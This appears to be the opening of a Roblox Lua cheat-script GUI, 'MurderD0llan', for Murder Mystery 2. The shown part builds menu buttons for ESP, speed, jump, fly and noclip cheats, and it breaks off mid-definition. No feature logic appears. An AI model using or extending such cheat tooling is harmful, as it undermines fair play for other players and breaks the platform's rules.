--[=[
MurderD0llan / Murder Mystery 2 Script Hub

creator: G0bbyD0llan

Version: 1.0.3
    
-----------------------------

The script was published and released to the public as version 1.0.0 by user "G0bbyD0llan" on June 1, 2025.
The script was last updated by user "G0bbyD0llan" Next Day, June 2, 2025, to version 1.0.1.
The script was last updated by user "G0bbyD0llan" on June 22, 2025, to version 1.0.2.
The script was last updated by user "G0bbyD0llan" on July 5 2025, to version 1.0.3.

This GUI Was Converted Using GUI2LUA, and the GUI was created by "G0bbyD0llan" and the original GUI was made by AI Assistant from Roblox Studio, Thanks!

- This Script Is NOT 100% Safe To Use, but functions of the script will work (this script Has Been Thoroughly Tested), use at your own risk
- G0bbyD0llan Is Not Responsible For Any Damage to Any Account Caused By The Script.









 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
]=]

-- Instances: 485 | Scripts: 9 | Modules: 9
local G2L = {};

-- StarterGui.MurderD0llan
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
G2L["1"]["Name"] = [[MurderD0llan]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;

-- StarterGui.MurderD0llan.MainWindow
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["Active"] = true;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["2"]["BackgroundTransparency"] = 1;
G2L["2"]["Size"] = UDim2.new(0, 483, 0, 259);
G2L["2"]["ClipsDescendants"] = true;
G2L["2"]["BorderColor3"] = Color3.fromRGB(61, 61, 61);
G2L["2"]["Position"] = UDim2.new(0.5447618961334229, -307, 0.4021739363670349, -105);
G2L["2"]["Name"] = [[MainWindow]];
-- Attributes
G2L["2"]:SetAttribute([[DRAG_ACTIVE]], true);

-- StarterGui.MurderD0llan.MainWindow.UICorner
G2L["3"] = Instance.new("UICorner", G2L["2"]);
G2L["3"]["CornerRadius"] = UDim.new(0, 6);

-- StarterGui.MurderD0llan.MainWindow.TitleBar
G2L["4"] = Instance.new("Frame", G2L["2"]);
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["4"]["Size"] = UDim2.new(1, 0, 0, 30);
G2L["4"]["ClipsDescendants"] = true;
G2L["4"]["Name"] = [[TitleBar]];

-- StarterGui.MurderD0llan.MainWindow.TitleBar.TitleLabel
G2L["5"] = Instance.new("TextLabel", G2L["4"]);
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5"]["TextSize"] = 16;
G2L["5"]["TextColor3"] = Color3.fromRGB(241, 241, 241);
G2L["5"]["Size"] = UDim2.new(1, -35, 1, 0);
G2L["5"]["Text"] = [[MurderD0llan / Murder Mystery 2]];
G2L["5"]["Name"] = [[TitleLabel]];
G2L["5"]["BackgroundTransparency"] = 1;
G2L["5"]["Position"] = UDim2.new(0, 5, 0, 0);

-- StarterGui.MurderD0llan.MainWindow.TitleBar.CloseButton
G2L["6"] = Instance.new("TextButton", G2L["4"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["AutoButtonColor"] = false;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(30, 31, 31);
G2L["6"]["TextSize"] = 18;
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["6"]["TextColor3"] = Color3.fromRGB(241, 241, 241);
G2L["6"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["6"]["Name"] = [[CloseButton]];
G2L["6"]["Text"] = [[X]];
G2L["6"]["Position"] = UDim2.new(1, -30, 0, 0);

-- StarterGui.MurderD0llan.MainWindow.TitleBar.CloseButton.UICorner
G2L["7"] = Instance.new("UICorner", G2L["6"]);
G2L["7"]["CornerRadius"] = UDim.new(0, 2);

-- StarterGui.MurderD0llan.MainWindow.TitleBar.Reposition
G2L["8"] = Instance.new("TextButton", G2L["4"]);
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["AutoButtonColor"] = false;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(30, 31, 31);
G2L["8"]["TextSize"] = 18;
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8"]["TextColor3"] = Color3.fromRGB(241, 241, 241);
G2L["8"]["Visible"] = false;
G2L["8"]["Size"] = UDim2.new(0, 28, 0, 30);
G2L["8"]["Name"] = [[Reposition]];
G2L["8"]["Text"] = [[+]];
G2L["8"]["Position"] = UDim2.new(0.9420289993286133, -30, 0, 0);

-- StarterGui.MurderD0llan.MainWindow.TitleBar.Reposition.UICorner
G2L["9"] = Instance.new("UICorner", G2L["8"]);
G2L["9"]["CornerRadius"] = UDim.new(0, 2);

-- StarterGui.MurderD0llan.MainWindow.ContentArea
G2L["a"] = Instance.new("Frame", G2L["2"]);
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["a"]["Size"] = UDim2.new(1, -2, 1.0071173906326294, -32);
G2L["a"]["ClipsDescendants"] = true;
G2L["a"]["Position"] = UDim2.new(0, 1, 0, 30);
G2L["a"]["Name"] = [[ContentArea]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1
G2L["b"] = Instance.new("ScrollingFrame", G2L["a"]);
G2L["b"]["Active"] = true;
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["CanvasSize"] = UDim2.new(0, 0, 0, 1187);
G2L["b"]["TopImage"] = [[]];
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["BackgroundTransparency"] = 0.9599999785423279;
G2L["b"]["Size"] = UDim2.new(0, 367, 0, 228);
G2L["b"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Position"] = UDim2.new(0, 0, -6.667785612535226e-08, 0);
G2L["b"]["Name"] = [[page_1]];
G2L["b"]["BottomImage"] = [[]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.ESP
G2L["c"] = Instance.new("TextButton", G2L["b"]);
G2L["c"]["TextWrapped"] = true;
G2L["c"]["TextStrokeTransparency"] = 0;
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["TextSize"] = 20;
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["c"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["c"]["Name"] = [[ESP]];
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Text"] = [[ Esp  ]];
G2L["c"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);
-- Attributes
G2L["c"]:SetAttribute([[Debug_Text]], [[Esp - Disabled]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.ESP.Frame
G2L["d"] = Instance.new("Frame", G2L["c"]);
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["d"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.ESP.UIGradient
G2L["e"] = Instance.new("UIGradient", G2L["c"]);
G2L["e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.UIListLayout
G2L["f"] = Instance.new("UIListLayout", G2L["b"]);
G2L["f"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["f"]["Padding"] = UDim.new(0, 5);
G2L["f"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.ChangeButton1ESP
G2L["10"] = Instance.new("TextButton", G2L["b"]);
G2L["10"]["TextWrapped"] = true;
G2L["10"]["TextStrokeTransparency"] = 0;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["TextSize"] = 20;
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["10"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["10"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["10"]["Name"] = [[ChangeButton1ESP]];
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[  Type Of Esp - Everyone]];
G2L["10"]["Position"] = UDim2.new(0.09045226126909256, 0, 0.2952679395675659, 0);
-- Attributes
G2L["10"]:SetAttribute([[Debug_Text]], [[Type Of Esp - Everyone]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.ChangeButton1ESP.UIGradient
G2L["11"] = Instance.new("UIGradient", G2L["10"]);
G2L["11"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.ChangeButton1ESP.change
G2L["12"] = Instance.new("TextButton", G2L["10"]);
G2L["12"]["TextWrapped"] = true;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["12"]["TextSize"] = 14;
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["12"]["Name"] = [[change]];
G2L["12"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["Text"] = [[change]];
G2L["12"]["Position"] = UDim2.new(0.7406250238418579, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.Handler
G2L["13"] = Instance.new("LocalScript", G2L["b"]);
G2L["13"]["Name"] = [[Handler]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.GunESP
G2L["14"] = Instance.new("TextButton", G2L["b"]);
G2L["14"]["TextWrapped"] = true;
G2L["14"]["TextStrokeTransparency"] = 0;
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["TextSize"] = 18;
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["14"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["14"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["14"]["Name"] = [[GunESP]];
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[ Gun Dropped / Trap Placed ESP   ]];
G2L["14"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);
-- Attributes
G2L["14"]:SetAttribute([[Debug_Text]], [[Gun Esp - Disabled]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.GunESP.Frame
G2L["15"] = Instance.new("Frame", G2L["14"]);
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["15"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.GunESP.UIGradient
G2L["16"] = Instance.new("UIGradient", G2L["14"]);
G2L["16"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextLabel
G2L["17"] = Instance.new("TextLabel", G2L["b"]);
G2L["17"]["TextWrapped"] = true;
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17"]["TextSize"] = 16;
G2L["17"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Text"] = [[- - - - - - - - - -  - - - - - - - - - -  - - - - - - - - - -  ]];
G2L["17"]["BackgroundTransparency"] = 1;
G2L["17"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.WalkSpeed
G2L["18"] = Instance.new("TextButton", G2L["b"]);
G2L["18"]["TextWrapped"] = true;
G2L["18"]["TextStrokeTransparency"] = 0;
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["TextSize"] = 20;
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["18"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["18"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["18"]["Name"] = [[WalkSpeed]];
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[Change WalkSpeed  ]];
G2L["18"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.WalkSpeed.Frame
G2L["19"] = Instance.new("Frame", G2L["18"]);
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["19"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.WalkSpeed.UIGradient
G2L["1a"] = Instance.new("UIGradient", G2L["18"]);
G2L["1a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextBoxButton1WalkSpeed
G2L["1b"] = Instance.new("TextButton", G2L["b"]);
G2L["1b"]["TextWrapped"] = true;
G2L["1b"]["TextStrokeTransparency"] = 0;
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["TextSize"] = 20;
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1b"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["1b"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["1b"]["Name"] = [[TextBoxButton1WalkSpeed]];
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Text"] = [[  Enter WalkSpeed Here...]];
G2L["1b"]["Position"] = UDim2.new(0.5456903576850891, 0, 0.8142253160476685, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextBoxButton1WalkSpeed.UIGradient
G2L["1c"] = Instance.new("UIGradient", G2L["1b"]);
G2L["1c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextBoxButton1WalkSpeed.TextBox
G2L["1d"] = Instance.new("TextBox", G2L["1b"]);
G2L["1d"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["1d"]["TextSize"] = 14;
G2L["1d"]["TextWrapped"] = true;
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["1d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d"]["PlaceholderText"] = [[enter...]];
G2L["1d"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Text"] = [[]];
G2L["1d"]["Position"] = UDim2.new(0.7409999966621399, 0, 0.17599999904632568, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.ChangeButton2WalkSpeed
G2L["1e"] = Instance.new("TextButton", G2L["b"]);
G2L["1e"]["TextWrapped"] = true;
G2L["1e"]["TextStrokeTransparency"] = 0;
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["TextSize"] = 20;
G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1e"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["1e"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["1e"]["Name"] = [[ChangeButton2WalkSpeed]];
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Text"] = [[  Type Of Speed - Normal]];
G2L["1e"]["Position"] = UDim2.new(0.09045226126909256, 0, 0.2952679395675659, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.ChangeButton2WalkSpeed.UIGradient
G2L["1f"] = Instance.new("UIGradient", G2L["1e"]);
G2L["1f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.ChangeButton2WalkSpeed.change
G2L["20"] = Instance.new("TextButton", G2L["1e"]);
G2L["20"]["TextWrapped"] = true;
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["20"]["TextSize"] = 14;
G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["20"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["20"]["Name"] = [[change]];
G2L["20"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["Text"] = [[change]];
G2L["20"]["Position"] = UDim2.new(0.7406250238418579, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextLabel
G2L["21"] = Instance.new("TextLabel", G2L["b"]);
G2L["21"]["TextWrapped"] = true;
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21"]["TextSize"] = 16;
G2L["21"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Text"] = [[- - - - - - - - - -  - - - - - - - - - -  - - - - - - - - - -  ]];
G2L["21"]["BackgroundTransparency"] = 1;
G2L["21"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.JumpPower
G2L["22"] = Instance.new("TextButton", G2L["b"]);
G2L["22"]["TextWrapped"] = true;
G2L["22"]["TextStrokeTransparency"] = 0;
G2L["22"]["BorderSizePixel"] = 0;
G2L["22"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["TextSize"] = 20;
G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["22"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["22"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["22"]["Name"] = [[JumpPower]];
G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22"]["Text"] = [[Change JumpPower  ]];
G2L["22"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.JumpPower.Frame
G2L["23"] = Instance.new("Frame", G2L["22"]);
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["23"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.JumpPower.UIGradient
G2L["24"] = Instance.new("UIGradient", G2L["22"]);
G2L["24"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextBoxButton1JumpPower
G2L["25"] = Instance.new("TextButton", G2L["b"]);
G2L["25"]["TextWrapped"] = true;
G2L["25"]["TextStrokeTransparency"] = 0;
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["TextSize"] = 20;
G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["25"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["25"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["25"]["Name"] = [[TextBoxButton1JumpPower]];
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Text"] = [[  Enter JumpPower Here...]];
G2L["25"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.8508771657943726, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextBoxButton1JumpPower.UIGradient
G2L["26"] = Instance.new("UIGradient", G2L["25"]);
G2L["26"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextBoxButton1JumpPower.TextBox
G2L["27"] = Instance.new("TextBox", G2L["25"]);
G2L["27"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["27"]["TextSize"] = 14;
G2L["27"]["TextWrapped"] = true;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["27"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["27"]["PlaceholderText"] = [[enter...]];
G2L["27"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["Text"] = [[]];
G2L["27"]["Position"] = UDim2.new(0.7409999966621399, 0, 0.17599999904632568, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextLabel
G2L["28"] = Instance.new("TextLabel", G2L["b"]);
G2L["28"]["TextWrapped"] = true;
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["28"]["TextSize"] = 16;
G2L["28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["Text"] = [[- - - - - - - - - -  - - - - - - - - - -  - - - - - - - - - -  ]];
G2L["28"]["BackgroundTransparency"] = 1;
G2L["28"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.fly
G2L["29"] = Instance.new("TextButton", G2L["b"]);
G2L["29"]["TextWrapped"] = true;
G2L["29"]["TextStrokeTransparency"] = 0;
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["TextSize"] = 20;
G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["29"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["29"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["29"]["Name"] = [[fly]];
G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["Text"] = [[Fly  ]];
G2L["29"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.fly.Frame
G2L["2a"] = Instance.new("Frame", G2L["29"]);
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["2a"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.fly.UIGradient
G2L["2b"] = Instance.new("UIGradient", G2L["29"]);
G2L["2b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.nolip
G2L["2c"] = Instance.new("TextButton", G2L["b"]);
G2L["2c"]["TextWrapped"] = true;
G2L["2c"]["TextStrokeTransparency"] = 0;
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["TextSize"] = 20;
G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2c"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["2c"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["2c"]["Name"] = [[nolip]];
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Text"] = [[Noclip  ]];
